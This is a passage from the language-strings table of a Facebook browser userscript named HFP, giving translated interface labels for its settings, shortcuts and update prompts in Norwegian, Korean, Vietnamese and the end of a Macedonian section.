		'ProtocolYahoo' : 'Разговарај со %s преку Yahoo Messenger',
		'ProtocolGoogle' : 'Разговарај со %s преку Google Talk',
		'ReloadErrorPage' : 'Пробај повторно, или почекај 5 секунди',
		'Refresh' : 'Освежи',
		'Remove' : 'Избриши',
		'Right' : 'Десно',
		'ShowBigPictures' : 'Покажи големи фотографии',
		'Signs' : Array('Јарец','Водолија','Риби','Овен','Бик','Близнаци','Рак','Лав','Девица','Вага','Скорпија','Стрелец'),
		'today' : 'денес',
		'Translators' : 'Преведувачи',
		'UpdateAvailable1' : 'Достапна е надоградба за HFP',
		'UpdateAvailable2' : 'Дали сакаш да надоградиш сега?',
		'UpdateHomepage' : 'Оди на почетна',
		'UpdateInstall' : 'Инсталирај сега',
		'UpdateTomorrow' : 'Потсетиме утре',
		'yearsOld' : '%s години'
	},
	
	// Norwegian - Contributed by Eilif Nordseth (20100819)
	nb : {	
		'_language' : 'Norwegian',
		'AddToCalendar' : 'Legg til kalender',
		'AddToGoogleCalendar' : 'Legg til Google kalendar',
		'all' : 'alle',
		'All' : 'AllE',
		'AllPhotosLoaded' : 'Alle bilder lastet inn',
		'Automatic' : 'Automatisk',
		'Birthday' : '%s\'s fødselsdag',
		'BookmarkAdd' : 'Legg til nytt bokmerke',
		'BookmarkExists' : 'Det er allerede et bokmerke til denne siden.\n\nGå til siden du ønsker å bokmerke og forsøk igjen.',
		'BookmarkNamePrompt' : 'Legg inn et navn til dette bokmerketet:\n%s',
		'BookmarksConfirmRemoval' : 'Er du sikker på at du vil fjerne disse bokmerkene?',
		'BookmarksManage' : 'Behandle bokmerker',
		'BookmarksRemoveSelected' : 'Fjern valgte bokmerker',
		'Bookmarks' : 'Bokmerker',
		'BrowserUnsupported' : 'Nettleseren din støtter ikke dette valget.',                                 
		'CreatingFile' : 'Lager fil',
		'Close' : 'Lukk',
		'ConfigureFacebookFixer' : 'HFP - Alternativer',
		'ConfigureInstructions' : 'Alle endringer lagres umiddelbart, men noen forandringer virker ikke i faner som allerede er åpne.',
		'ConfAge' : 'Vis en person\'s alder på profilen (om de viser hele fødselsdatoen sin).',
		'ConfAlbumComments' : 'Legg til en lenke på album-sider for å vise alle kommentarene til albumet.',
		'ConfApplicationWhitelist' : 'Applikasjoner\'s Hvit-liste - Legg in ID\'ene til applikasjoner for å hindre at de blir skjult. Adskill ID\'er med mellomrom.',
		'ConfAutoBigAlbumPictures' : 'Automatisk vis større albumbilder når siden åpnes.',
		'ConfAutoLoadFullAlbum' : 'Automatisk last inn fimerkebilder for alle bildene i et album på ei enkel side.',
		'ConfAutoLoadTaggedPhotos' : 'Automatisk last inn fimerkebilder for alle merkede bilder på ei enkel side (bildefaner på personer\'s profiler).',
		'ConfAutoReadMore' : 'Automatisk klikk på "les mer"-lenker.',
		'ConfBigAlbumPictures' : 'Legg til ei lenke på album sider for kunne vise større versjoner av alle bildene på den siden.',
		'ConfBigAlbumPicturesBorder' : 'Add a border around bigger versions of pictures.',
		'ConfBookmarks' : 'Legg en bokmerke-undermeny til toppmeny-linjen.',
		'ConfBottomBarHoverOpacity' : 'Ved mus-over',
		'ConfBottomBarOpacity' : 'Bunmeny-linjen\'s gjennomsiktighet',
		'ConfCalendarBirthDate' : 'Inkluder personen\'s fødselsdato i hendelsesdetaljer.',
		'ConfCalendarFullName' : 'Bruke personen\'s fulle navn som tittel til fødselsdager (istedenfor bare fornavn).',
		'ConfChatDifferentiate' : 'Bruke fete typer og kursiv til å skille mellom tilgjengelige og fraværende venner.',
		'ConfChatHideIdle' : 'Skjul frværende venner.',
		'ConfDelayPopupPics' : 'Legg inn en kort pause før sprettopp-bilder vises.',
		'ConfDelayPopupPicsTimeout' : 'Pause før sprettopp-bilder vises, i millisekunder (standard=500):',
		'ConfDownloadVideo' : 'Legg til en lenke for å kunne laste ned videoer fra video-sider. (Du kan få behov for en <a href="http://en.wikipedia.org/wiki/Flash_Video#FLV_players" target="_blank">FLV-spiller</a>)',
		'ConfErrorPageReload' : 'Automatisk laste inn igjen en applikasjon\'s feilsider etter 5 sekunder.',
		'ConfExport' : 'For å eksportere oppsettet ditt, kopier teksten nedenfor og lagre den i en fil.',
		'ConfExternalPopup' : 'Sprettopp versjoner i full-størrelse av eksterne bilder. <sup>beta</sup>',
		'ConfFacebookHFPLanguage' : 'Språk til HFP',
		'ConfFacebookTimestamps' : 'Vis Facebook tidsangivelse (eg. "3 timer siden").',
		'ConfFBFTimestamps' : 'Legg til HFP tidsangivelser etter Facebook tider (eg. "11:45").',
		'ConfFBFTimestamps24' : 'Vis HFP tidsangivelser i 24-timers format.',
		'ConfFriendRequestCountInTitle' : 'Vis antall nye venneforespørsler i sidetittelen.',
		'ConfGoogleApps' : 'Gjør Google kalender-lenker kompatible med Google Apps.',
		'ConfGoogleAppsDomain' : 'Domene',
		'ConfGoogleCalendar' : 'Legg inn lenker til Legg til Fødselsdager og Hendelser for <a href="http://en.wikipedia.org/wiki/Google_Calendar" target="_blank">Google kalender</a>.',
		'ConfGoogleLanguage' : 'Språk for <a href="http://en.wikipedia.org/wiki/Google_Translate" target="_blank">Google Oversettelse</a>',
		'ConfHideApplicationStories' : 'Skjul applikasjonsoversikter.',
		'ConfHideEventStories' : 'Skjul hendelseoversikt.',
		'ConfHideFacebookCountInTitle' : 'Skjul Facebook\'s oppsummering av nye innboks-meldiger.',
		'ConfHideFriendStories' : 'Skjul venneoversikt.',
		'ConfHideGroupStories' : 'Skjul gruppeoversikt.',
		'ConfHideLikeStories' : 'Skjul liker-oversikt.',
		'ConfHideLinkStories' : 'Skjul lenke-oversikt.',
		'ConfHideNoteStories' : 'Skjul notat-oversikt.',
		'ConfHidePhotoStories' : 'Skjul bilde-oversikt.',
		'ConfHidePlaceStories' : 'Skjul steds-hendelser.',
		'ConfHideProfilePicStories' : 'Skjul profilbilde-oversikt.',
		'ConfHideRead' : 'Skjul objekter i aktiv Notis som er blitt markert som røde.',
		'ConfHideRelationshipStories' : 'Skjul Forhold-oversikt.',
		'ConfHideStatusStories' : 'Skjul Status-oversikt.',
		'ConfHideVideoStories' : 'Skjul Video-oversikt.',
		'ConfHideWallStories' : 'Skjul Vegg-oversikt.',
		'ConfHomeBeta' : 'Vis Beta Tester seksjonen.',
		'ConfHomeChat' : 'Vis  Chat-seksjonen.',
		'ConfHomeEvents' : 'Vis Hendelse-seksjonen.',
		'ConfHomeFindFriends' : 'Vis Koble til Venner-seksjonen.',
		'ConfHomeLeftAlign' : 'Venstrestill innhold på Hjem-siden.',
		'ConfHomeLeftColumn' : 'Vis venstre kolonne.',
		'ConfHomeLeftColumnFixed' : 'Behold den venstre kolonnen synlig, selv etter rulling nedover.',
		'ConfHomeLink' : 'Vis Hjem-lenken i toppmeny-feltet.',
		'ConfHomeNavigation' : 'Vis Navigasjons-seksjonen.',
		'ConfHomePokes' : 'Vis Pokes-seksjonen.',
		'ConfHomeProfile' : 'Vis Profil-seksjonen.',
		'ConfHomeRecommendations' : 'Vis anbefalinger (Personer du kanskje kjenner, anbefalte sider etc).',
		'ConfHomeRequests' : 'Vi Forespørsel-seksjonen.',
		'ConfHomeRightColumn' : 'Vis høyre kolonne.',
		'ConfHomeStretch' : 'Strekk siden Hjem til netteleserens vidde fullt ut.',
		'ConfHomeStretchComments' : 'Strekk kommentarfeltene på Hjem-sida.',
		'ConfiCalendar' : 'Legg lenke til Laste ned en <a href="http://en.wikipedia.org/wiki/ICalendar" target="_blank">iCalendar</a> fil med alle fødselsdagene.',
		'ConfImport' : 'For å kunne importere oppsettet ditt senere, skriver du over teksten nedenfor med teksten du lagret idligere og klikk "Import".',
		'ConfInboxCountInTitle' : 'Vis antall nye innboks-meldinger på tittellinjen til siden.',
		'ConfLogoutLink' : 'Legg til en Logg-ut lenke på topp-meny linjen.',
		'ConfNotificationCountInTitle' : 'Vis antall nye Varsler i sidetittelen.',
		'ConfNewTabSearch' : 'La søkeresultatet åpnes i ny fane/vindu ved søk med trykk av CTRL + Enter.',
		'ConfPageTitle' : 'Fjern "Facebook |" fra tittelen på hver side.',
		'ConfPhotoPopup' : 'Sprettopp større versjoner av bilder ved mus-over.',
		'ConfPopupAutoClose' : 'Lukk sprettopp-bilder automatisk.',
		'ConfPopupSmartAutoClose' : 'Hindre sprettopp-bilder i å lukkes automatisk om musen er over det.',
		'ConfPopupPosition' : 'Posisjon for sprettopp-bilder',
		'ConfProcessInterval' : 'Intervall for å lage siden, i millisekund (standard=1000):',
		'ConfProfileLink' : 'Vis Profil-lenken i toppmeny linjen.',
		'ConfProfilePicPopup' : 'Sprettopp større versjoner av profil-bilder ved musover',
		'ConfProtocolLinks' : 'Endre meldings ID\'er på profiler til lenker som starter en dialog med dem (Google Talk, Windows Live etc).',
		'ConfSectionAbout' : 'Om HFP',
		'ConfSectionAdvanced' : 'Avansert',
		'ConfSectionEvents' : 'Fødselsdager/Hendelser',
		'ConfSectionImportExport' : 'Import/Eksport',
		'ConfSectionFeeds' : 'Notiser',
		'ConfSectionHomePage' : 'Hjem side',
		'ConfSectionLiveFeed' : 'Aktive Notiser',
		'ConfSectionMenu' : 'Menyer/Chat',
		'ConfSectionOther' : 'Andre alternativer',
		'ConfSectionPageTitle' : 'Sidetittel',
		'ConfSectionPictures' : 'Bilder',
		'ConfSectionShortcuts' : 'Tastatur-Snarveier',
		'ConfSecureLinks' : 'La Facebook lenker peke til HTTPS sider.',
		'ConfShortcutList' : '<b>Tastatur-Snarveier</b> (små/store sensitive):<br /><br /><i>Fra hvilken som helst side:</i><br /> <b>A</b> - Album/bilder<br /> <b>B</b> - Handtere venneliste (nettvenner)<br /> <b>C</b> - HFP oppsett<br /> <b>D</b> - Fødselsdager<br /> <b>E</b> - Hendelser<br /> <b>F</b> - Venner<br /> <b>H</b> - Hjem side<br /> <b>I</b> - Innboks<br /> <b>K</b> - Legg til Bokmerke<br /> <b>L</b> - Velg Logg ut lenken (trykk Enter etterpå for å logge ut)<br /> <b>N</b> - Varsler<br /> <b>P</b> - Din Profil<br /> <b>R</b> - Forespørsler<br /> <b>S</b> - Hopp til søkefeltet<br /> <b>T</b> - Oversett valgt tekst<br /> <b>?</b> - Vis HFP\'s feilrette-info<br /> <b><escape></b> - Lukk sprettopp\'er laget av HFP<br /><br /><i>Fra Hjem siden (filtere)</i>:<br /> <b>a</b> - Sider<br /> <b>f</b> - Aktiv Notis<br /> <b>g</b> - Grupper<br /> <b>l</b> - Lenker<br /> <b>n</b> - Nyhets Notiser<br /> <b>p</b> - Bilder<br /> <b>s</b> eller <b>u</b> - Status-Oppdateringer<br /> <b>t</b> - Notater<br /> <b>v</b> - Videoer<br /><br /><i>Fra profiler</i>:<br /> <b>i</b> - Info<br /> <b>p</b> - Bilder<br /> <b>w</b> - Vegg<br /> <b>x</b> - Bokser<br /><br /><i>Fra sider med nummerering (forrige, neste, etc)</i><br /> <b><venstre pil></b> - Forrige<br /> <b><høyre pil></b> - Neste<br /> <b><shift> + <venstre pil></b> - Første (når tilgjengelig)<br /> <b><shift> + <høyre pil></b> - Siste (når tilgjengelig)<br /><br /><i>Mens man ser på album/bilder:</i><br /> <b>a</b> - Last alle frimerkebilder (når tilgjengelig)<br /> <b>b</b> - Vis store bilder<br /> <b>c</b> - Se på kommentarer<br /> <b>k</b> - Tilbake til album<br /> <b>m</b> - Bilder av (person) og meg<br /><br /><i>Mens man ser på siste album og opplastede/merkede bilder:</i><br /> <b>a</b> eller  <b>r</b> - Siste Album<br /> <b>m</b> eller  <b>u</b> - Mobile opplastinger<br /> <b>o</b> - Bilder av meg<br /> <b>p</b> - Mine bilder<br /> <b>t</b> eller  <b>f</b> - Merkede venner',
		'ConfShortcuts' : 'Aktiver tastatur-snarveier.',
		'ConfSign' : 'Vis en person\'s stjernetegn på profilen (om de oppgir fødselsdatoen sin).',
		'ConfTopBarFixed' : 'Behold alltid toppmeny-linjen på skjermen, til og med etter rulling nedover.',
		'ConfTopBarHoverOpacity' : 'Ved mus-over',
		'ConfTopBarOpacity' : 'Toppmenyens gjennomsiktighet',
		'DownloadVideo' : 'Last ned video',
		'ExportICalendarFile' : 'Eksporter iCalendar fil',
		'ExportICalendarFileWarning' : '(Dette vil ta ei stund om du har mange venner)',
		'FacebookFixerConflict' : 'Facebook Fixer er nå kjent som HFP.<br /><br />På grunn av navnebyttet må du manuelt avinstallere Facebook Fixer fra nettleseren din, ellers vil de to scriptene komme i konflikt med hverandre.<br /><br />Dersom du ikke er sikker på hvordan man avinstallerer et brukerscript, <a %s>klikk her for instruksjoner</a>.',
		'fullAlbumLoaded' : 'hele album lastet',
		'Import' : 'Importer',
		'ImportConfirm' : 'Er du sikker på at du vil importere dette oppsettet?\nDine nåværende valg vil bli tapt.',
		'ImportFailure' : 'En feil oppstod mmens oppsettet ditt ble forsøkt importert.',
		'ImportSuccess' : 'Importering fullført. Ønsker du å oppfriske siden?',
		'Left' : 'Venstre',
		'LoadingAllPhotos' : 'Laster alle bilder...',
		'loadingFullAlbum' : 'Laster hele album...',
		'LoadingPic' : 'Laster bilde...',
		'LoadPhotosWarning' : 'Laste alle bilder kan ta lang tid',
		'Months' : new Array('Januar','Februar','Mars','April','Mai','Juni','Juli','August','September','Oktober','November','Desember'),
		'ProtocolSkype' : 'Ring %s ved å bruke Skype',
		'ProtocolMSN' : 'Chat med %s ved å bruke Windows Live',
		'ProtocolYahoo' : 'Chat med %s ved å bruke Yahoo Messenger',
		'ProtocolGoogle' : 'Chat med %s ved å bruke Google Talk',
		'ReloadErrorPage' : 'Klikk for å forsøke på nytt, eller vent 5 sekunder',
		'Refresh' : 'Oppfrisk',
		'Remove' : 'Fjern',
		'Right' : 'Høyre',
		'ShowBigPictures' : 'Vis store bilder',
		'Signs' : new Array('Steinbukken','Vannmannen','Fiskene','Væren','Tyren','Tvillingene','Krepsen','Løven','Jomfruen','Vekten','Skorpionen','Skytten'),
		'today' : 'i dag',
		'Translators' : 'Oversettere',
		'UpdateAvailable1' : 'En oppdatering til HFP er tilgjengelig',
		'UpdateAvailable2' : 'Vil du oppdatere nå?',
		'UpdateHomepage' : 'Gå til hjem siden',
		'UpdateInstall' : 'Installer nå',
		'UpdateTomorrow' : 'Minn meg på om dette i morgen',
		'ViewAlbumComments' : 'Vis album-kommentarer',
		'yearsOld' : '%s år gammel'
	},

	// Korean - Contributed by 박상빈 (20100823)
	ko : {
		'_language' : 'Korean',
		'AddToCalendar' : '달력에 추가',
		'AddToGoogleCalendar' : '구글 캘린더에 추가',
		'all' : '전체',
		'All' : '모든 사진',
		'AllPhotosLoaded' : '모든 사진을 로드했습니다',
		'Automatic' : '자동',
		'Birthday' : '%s\의 생일',
		'BookmarkAdd' : '즐겨찾기에 추가',
		'BookmarkExists' : '이 페이지는 이미 즐겨찾기 되어 있습니다.\n\n즐겨찾기 하실 페이지로 가서 다시 시도하세요.',
		'BookmarkNamePrompt' : '즐겨찾기 이름:\n%s',
		'BookmarksConfirmRemoval' : '다음의 즐겨찾기를 정말로 지우시겠습니까?',
		'BookmarksManage' : '즐겨찾기 관리',
		'BookmarksRemoveSelected' : '선택한 즐겨찾기 삭제',
		'Bookmarks' : '즐겨찾기',
		'BrowserUnsupported' : '이 기능은 현재 브라우저에서는 작동하지 않습니다.',
		'CreatingFile' : '파일 만드는 중',
		'Close' : '닫기',
		'ConfigureFacebookFixer' : 'HFP 설정',
		'ConfigureInstructions' : '변경사항은 선택즉시 적용됩니다. 다른 열려있는 탭에는 바로 적용되지 않을 수 있습니다.',
		'ConfAge' : '친구의 프로필에 친구의 나이 표시 (생년월일을 공개한 경우).',
		'ConfAlbumComments' : '사진첩 페이지에 "사진첩에 달린 댓글 모두보기" 링크 더하기.',
		'ConfApplicationWhitelist' : '허용된 어플리케이션 - 숨기지 않을 어플리케이션의 ID를 입력하세요. ID 사이는 스페이스로 나눔.',
		'ConfAutoBigAlbumPictures' : '사진 페이지에 큰 사진첩 사진을 보이기.',
		'ConfAutoLoadFullAlbum' : '사진첩 페이지에 모든 사진을 한번에 보이기.',
		'ConfAutoLoadTaggedPhotos' : '사진 페이지에 태그달린 모든 사진을 보이기.',
		'ConfAutoReadMore' : '"지난 게시물" 링크를 자동으로 누르기.',
		'ConfBigAlbumPictures' : '사진첩 페이지에 "큰 사진 보기" 링크 더하기.',
		'ConfBookmarks' : '맨 위 메뉴 표시줄에 즐겨찾기 메뉴를 더하기.',
		'ConfBottomBarHoverOpacity' : '마우스 커서를 올려놨을때',
		'ConfBottomBarOpacity' : '아래 표시줄의 투명도',
		'ConfCalendarBirthDate' : '이벤트의 추가정보에 친구의 생일 보이기.',
		'ConfCalendarFullName' : '생일을 표시할때 성과 이름을 모두 표시하기 (기본은 성을 표시하지 않음).',
		'ConfChatDifferentiate' : '자리비움 상태인 친구와 온라인 상태인 친구를 이탤릭체와 굵은 글씨로 구분하기.',
		'ConfChatHideIdle' : '자리비움 상태의 친구는 숨기기.',
		'ConfDelayPopupPics' : '조금 기다렸다가 팝업 사진 보이기.',
		'ConfDelayPopupPicsTimeout' : '팝업 사진을 보이기 전까지의 대기 시간, 1/1000초 단위 (기본은 500):',
		'ConfDownloadVideo' : '비디오 페이지에 다운로드 링크 더하기. (<a href="http://en.wikipedia.org/wiki/Flash_Video#FLV_players" target="_blank">FLV 플레이어</a>가 필요할수도 있습니다)',
		'ConfErrorPageReload' : '어플리케이션 오류 페이지를 5초 후에 자동으로 새로고침.',
		'ConfExport' : '설정사항을 내보내고 싶으시면 아래의 텍스트를 복사해서 파일에 저장하십시오.',
		'ConfExternalPopup' : '마우스 커서를 외부 사진에 올리면 을 큰 팝업 사진을 보이기. <sup>베타</sup>',
		'ConfFacebookHFPLanguage' : 'HFP에 사용할 언어',
		'ConfFacebookTimestamps' : 'Facebook 형식의 타임스탬프 보이기 (예. "약 3시간 전").',
		'ConfFBFTimestamps' : 'HFP 형식의 타임스탬프를 Facebook 타임스탬프 뒤에 보이기 (예. "11:45").',
		'ConfFBFTimestamps24' : 'HFP 타임스탬프를 24시간 형식으로 보이기.',
		'ConfFriendRequestCountInTitle' : '페이지 제목에 친구 요청 갯수 보이기.',
		'ConfGoogleApps' : '구글 Apps와 호환되는 구글 캘린더 링크 만들기.',
		'ConfGoogleAppsDomain' : '도메인',
		'ConfGoogleCalendar' : '생일과 이벤트를 <a href="http://www.google.com/support/calendar/bin/topic.py?hl=kr&topic=13732" target="_blank">구글 캘린더</a>에 추가하는 링크 더하기.',
		'ConfGoogleLanguage' : '<a href="http://en.wikipedia.org/wiki/Google_Translate" target="_blank">구글 번역</a>에 사용할 언어',
		'ConfHideApplicationStories' : '어플리케이션 게시물 숨기기.',
		'ConfHideEventStories' : '이벤트 게시물 숨기기.',
		'ConfHideFacebookCountInTitle' : 'Facebook의 쪽지 갯수 숨기기.',
		'ConfHideFriendStories' : '친구들의 게시물 숨기기.',
		'ConfHideGroupStories' : '그룹 게시물 숨기기.',
		'ConfHideLikeStories' : '"좋아요" 게시물 숨기기.',
		'ConfHideLinkStories' : '링크 게시물 숨기기.',
		'ConfHideNoteStories' : '노트 게시물 숨기기.',
		'ConfHidePhotoStories' : '사진 게시물 숨기기.',
		'ConfHideProfilePicStories' : '프로필 사진 게시물 숨기기.',
		'ConfHideRead' : '최신글 목록에서 읽은 게시물 숨기기.',
		'ConfHideRelationshipStories' : '결혼/연애 게시물 숨기기.',
		'ConfHideStatusStories' : '"내 상태" 게시물 숨기기.',
		'ConfHideVideoStories' : '비디오 게시물 숨기기.',
		'ConfHideWallStories' : '담벼락 게시물 숨기기.',
		'ConfHomeBeta' : 'Facebook Sneak Peek 보이기.',
		'ConfHomeChat' : '채팅 보이기.',
		'ConfHomeEvents' : '이벤트 보이기.',
		'ConfHomeFindFriends' : '연결하기 보이기.',
		'ConfHomeLeftAlign' : '첫 페이지를 왼쪽으로 정렬.',
		'ConfHomeLeftColumn' : '왼쪽 메뉴 보이기.',
		'ConfHomeLeftColumnFixed' : '아래로 스크롤 한 후에도 왼쪽 메뉴 보이기.',
		'ConfHomeLink' : '맨 위 메뉴 표시줄에 "첫 페이지" 링크 보이기.',
		'ConfHomeNavigation' : '네비게이션 메뉴 보이기.',
		'ConfHomePokes' : 'Pokes 보이기.',
		'ConfHomeProfile' : '프로필 보이기.',
		'ConfHomeRecommendations' : '추천 보이기.',
		'ConfHomeRequests' : '요청 보이기.',
		'ConfHomeRightColumn' : '오른쪽 메뉴 보이기.',
		'ConfHomeStretch' : '브라우저의 가로 크게에 맞게 첫 페이지 내용을 늘이기 .',
		'ConfHomeStretchComments' : '브라우저의 가로 크기에 맞게 댓글을 늘이기.',
		'ConfiCalendar' : '모든 생일을 <a href="http://en.wikipedia.org/wiki/ICalendar" target="_blank">iCalendar</a> 파일로 받는 링크 더하기.',
		'ConfImport' : '설정사항을 가져오고 싶으시면 저장한 텍스트를 아래에 붙인 후 "가져오기"를 누르십시오.',
		'ConfInboxCountInTitle' : '페이지 제목에 새 쪽지 갯수 보이기.',
		'ConfLogoutLink' : '맨 위 메뉴 표시줄에 로그아웃 링크 더하기.',
		'ConfNotificationCountInTitle' : '페이지 제목에 새 알림 갯수 보이기.',
		'ConfNewTabSearch' : '검색창에서 CTRL+엔터 키를 누르면 새 탭/창에 검색결과를 보이기.',
		'ConfPageTitle' : '"Facebook |"을 페이지 제목에서 없애기.',
		'ConfPhotoPopup' : '마우스 커서를 프로필 사진에 올리면 큰 팝업 사진을 보이기.',
		'ConfPopupAutoClose' : '자동으로 팝업 사진 닫기.',
		'ConfPopupSmartAutoClose' : '마우스 커서를 올리고 있으면 팝업사진을 자동으로 닫지 않기.',
		'ConfPopupPosition' : '팝업 사진 위치',
		'ConfProcessInterval' : '페이지를 처리하는 간격, 1/1000초 단위 (기본은 1000):',
		'ConfProfileLink' : '맨 위 메뉴 표시줄에 프로필 링크 보이기.',
		'ConfProfilePicPopup' : '마우스 커서를 사진에 올리면 큰 팝업 사진을 보이기.',
		'ConfProtocolLinks' : '프로필에 있는 메신저 ID(구글토크, 윈도우 라이브 메신저, 등)를 메신저를 통해 대화를 시작하는 링크로 변환하기.',
		'ConfSectionAbout' : 'HFP는...',
		'ConfSectionAdvanced' : '고급',
		'ConfSectionEvents' : '생일/이벤트',
		'ConfSectionImportExport' : '가져오기/내보내기',
		'ConfSectionFeeds' : '게시물',
		'ConfSectionHomePage' : '첫 페이지',
		'ConfSectionLiveFeed' : '최신글',
		'ConfSectionMenu' : '메뉴/채팅',
		'ConfSectionOther' : '그 외 설정',
		'ConfSectionPageTitle' : '페이지 제목',
		'ConfSectionPictures' : '사진',
		'ConfSectionShortcuts' : '키보드 단축키',
		'ConfSecureLinks' : '항상 HTTPS를 통해 Facebook을 사용하기.',
		'ConfShortcutList' : '<b>키보드 단축키</b> (대소문자 구분):<br /><br /><i>모든 페이지에서 작동</i>:<br />&nbsp;<b>A</b> - 사진첩/사진<br />&nbsp;<b>B</b> - 접속된 친구 보이기/숨기기<br />&nbsp;<b>C</b> - HFP 설정<br />&nbsp;<b>D</b> - 생일<br />&nbsp;<b>E</b> - 이벤트<br />&nbsp;<b>F</b> - 친구<br />&nbsp;<b>H</b> - 첫 페이지<br />&nbsp;<b>I</b> - 쪽지<br />&nbsp;<b>K</b> - 즐겨찾기 더하기<br />&nbsp;<b>L</b> - 로그아웃 링크를 선택 (그다음 엔터키를 누르면 로그아웃)<br />&nbsp;<b>N</b> - 알림<br />&nbsp;<b>P</b> - 내 프로필<br />&nbsp;<b>R</b> - Requests<br />&nbsp;<b>S</b> - 검색 필드로 커서 이동<br />&nbsp;<b>T</b> - 선택한 텍스트를 번역<br />&nbsp;<b>?</b> - HFP 디버그 정보 보기<br />&nbsp;<b>&lt;ESC&gt;</b> - HFP 팝업 사진 닫기<br /><br /><i>홈페이지에서 작동(필터)</i>:<br />&nbsp;<b>a</b> - 페이지<br />&nbsp;<b>f</b> - 최신글<br />&nbsp;<b>g</b> - 그룹<br />&nbsp;<b>l</b> -링크<br />&nbsp;<b>n</b> - 뉴스 피드<br />&nbsp;<b>p</b> - 사진<br />&nbsp;<b>s</b> 또는 <b>u</b> - 상태 업데이트<br />&nbsp;<b>t</b> - 노트<br />&nbsp;<b>v</b> - 비디오<br /><br /><i>프로필 페이지에서 작동</i>:<br />&nbsp;<b>i</b> - 정보<br />&nbsp;<b>p</b> - 사진<br />&nbsp;<b>w</b> - 담벼락<br />&nbsp;<b>x</b> - Boxes<br /><br /><i>이동이 가능한 페이지에서 작동(이전, 다음, 등)</i>:<br />&nbsp;<b>&lt;←&gt;</b> - 이전<br />&nbsp;<b>&lt;→&gt;</b> - 다음<br />&nbsp;<b>&lt;Shift&gt; + &lt;←&gt;</b> - 처음 (가능할때만)<br />&nbsp;<b>&lt;Shift&gt; + &lt;→&gt;</b> - 마지막 (가능할때만)<br /><br /><i>사진첩/사진을 볼때 작동</i>:<br />&nbsp;<b>a</b> - 모든 썸네일 보기 (가능할때만)<br />&nbsp;<b>b</b> - 큰 사진 보이기<br />&nbsp;<b>c</b> - 댓글 보기<br />&nbsp;<b>k</b> - 사진첩으로 돌아가기<br />&nbsp;<b>m</b> - 내가(또는 친구가) 나온 사진<br /><br /><i>최근 사진첩이나 업로드/태그된 사진을 볼때 작동:</i><br />&nbsp;<b>a</b> 또는 &nbsp;<b>r</b> - 최근 사진첩<br />&nbsp;<b>m</b> 또는 <b>u</b> - 모바일 업로드<br />&nbsp;<b>o</b> - 내가 나온 사진<br />&nbsp;<b>p</b> -내 사진<br />&nbsp;<b>t</b> 또는 <b>f</b> - 태그 된 친구들',
		'ConfShortcuts' : '키보드 단축키 사용.',
		'ConfSign' : '친구의 프로필에 친구의 별자리 표시 (생년월일을 공개한 경우).',
		'ConfTopBarFixed' : '맨 위 메뉴 표시줄을 아래로 스크롤 한 후에도 보이기.',
		'ConfTopBarHoverOpacity' : '마우스 커서를 올려놨을때',
		'ConfTopBarOpacity' : '맨 위 메뉴 표시줄의 투명도',
		'DownloadVideo' : '비디오 다운로드',
		'ExportICalendarFile' : 'iCalender 파일로 가져오기',
		'ExportICalendarFileWarning' : '(친구가 많으면 오래 걸릴 수 있습니다)',
		'FacebookFixerConflict' : 'Facebook Fixer의 이름이 HFP로 바뀌었습니다.<br /><br />Facebook Fixer을 브라우저에서 제거하지 않으면 이름 변경 때문에 충돌이 일어납니다.<br /><br />userscript를 제거하는 방법을 모르겠으면 <a %s>여기를 참조하세요</a>.',
		'fullAlbumLoaded' : '앨범 전체가 로딩됨',
		'Import' : '가져오기',
		'ImportConfirm' : '정말로 설정을 가져오시겠습니까?\n현재 설정은 삭제됩니다.',
		'ImportFailure' : '설정을 가져오는 도중 에러가 났습니다.',
		'ImportSuccess' : '성공적으로 설정을 가져왔습니다. 새로고침 하시겠습니까?',
		'Left' : '왼쪽',
		'LoadingAllPhotos' : '모든 사진을 로딩중...',
		'loadingFullAlbum' : '앨범 전체를 로딩중...',
		'LoadingPic' : '사진 로딩중...',
		'LoadPhotosWarning' : '모든 사진을 로딩하는데 시간이 오래 걸릴 수 있습니다',
		'Months' : new Array('1월','2월','3월','4월','5월','6월','7월','8월','9월','10월','11월','12월'),
		'ProtocolSkype' : 'Skype로 %s와 전화하기',
		'ProtocolMSN' : 'Windows Live로 %s와 채팅하기',
		'ProtocolYahoo' : '야후 메신저로 %s와 채팅하기',
		'ProtocolGoogle' : '구글 토크로  %s와 채팅하기',
		'ReloadErrorPage' : '재시도 하려면 클릭하거나 5초를 기다리세요',
		'Refresh' : '새로고침',
		'Remove' : '제거',
		'Right' : '오른쪽',
		'ShowBigPictures' : '큰 사진 보기',
		'Signs' : new Array('염소자리','물병자리','물고기자리','양자리','황소자리','쌍둥이자리','게자리','사자자리','처녀자리','천칭자리','전갈자리','궁수자리'),
		'today' : '오늘',
		'Translators' : '번역한 사람',
		'UpdateAvailable1' : 'HFP 업데이트가 나왔습니다',
		'UpdateAvailable2' : '지금 업데이트 할까요?',
		'UpdateHomepage' : '홈페이지로 가기',
		'UpdateInstall' : '지금 인스톨 하기',
		'UpdateTomorrow' : '내일 다시 확인',
		'ViewAlbumComments' : '사진첩에 달린 댓글 모두보기',
		'yearsOld' : '%s살'
	},
	
	// Vietnamese - Contributed by Trần Đức Thịnh (20100104)
	// Hi vọng nhận được góp ý của mọi người về bản dịch, email: tranducthinh4102@gmail.com
	vi : {
		'_language' : 'Tiếng Việt',
		'AddToCalendar' : 'Thêm vào lịch',
		'AddToGoogleCalendar' : 'Thêm vào lịch của Google',
		'all' : 'tất cả',
		'All' : 'Tất cả',
		'AllPhotosLoaded' : 'Tải tất cả các bức ảnh',
		'Automatic' : 'Tự động',
		'Birthday' : 'sinh nhật của %s',
		'BookmarkAdd' : 'Thêm Bookmark mới',
		'BookmarkExists' : 'Trang này đã được đánh dấu.\n\nTruy cập vào trang bạn muốn đánh dấu và thử lại.',
		'BookmarkNamePrompt' : 'Đặt tên cho trang đánh dấu này:\n%s',
		'BookmarksConfirmRemoval' : 'Bạn muốn xóa các bookmark đã chọn?',
		'BookmarksManage' : 'Quản lý Bookmarks',
		'BookmarksRemoveSelected' : 'Xóa các Bookmarks đã chọn',
		'Bookmarks' : 'Bookmarks',
		'BrowserUnsupported' : 'Trình duyệt của bạn không hỗ trợ tính năng này.',
		'CreatingFile' : 'Tạo tập tin',
		'Close' : 'Đóng',
		'ConfigureFacebookFixer' : 'Cài đặt HFP',
		'ConfigureInstructions' : 'Mọi thiết lập sẽ được lưu ngay lập tức, nhưng một số thay đổi không có tác dụng trong các thẻ đang mở.',
		'ConfAge' : 'Hiển thị tuổi của một người trong thông tin của họ (nếu họ cung cấp ngày sinh đầy đủ).',
		'ConfAlbumComments' : 'Thêm một liên kết để hiển thị tất cả các bình luận về album ở phía trên album',
